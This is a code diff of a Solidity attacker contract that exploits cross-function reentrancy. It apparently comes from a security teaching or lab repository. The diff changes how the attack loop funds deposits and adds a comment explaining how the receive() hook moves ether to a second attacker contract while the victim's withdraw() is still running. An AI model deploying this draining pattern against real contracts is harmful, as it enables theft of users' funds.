@@ -8,7 +8,7 @@ contract attack_cross_function_reentrancy {
 
     attack2_cross_function_reentrancy public attacker2;
 
-    constructor(cross_function_reentrancy _victim) {
+    constructor(cross_function_reentrancy _victim) payable {
         victim = cross_function_reentrancy(_victim);
     }
 
@@ -17,13 +17,20 @@ contract attack_cross_function_reentrancy {
     }
 
     function attack() public payable {
-        victim.deposit{value: msg.value}();
+        uint256 value =  address(this).balance;
+        victim.deposit{value: value}();
         while(address(victim).balance >= amount) {
             victim.withdraw();
-            attacker2.send(msg.value, address(this));
+            attacker2.send( value , address(this));
         }
     }
 
+
+    /**
+     * @notice Receive ether. same amout of withdraw() but we can transfer same amount to attacker2. 
+     * Because burn balance of attacker1 after this function.
+     * @dev triggered by victim.withdraw()
+     */
     receive() external payable {
         victim.transfer(address(attacker2), msg.value);
     }
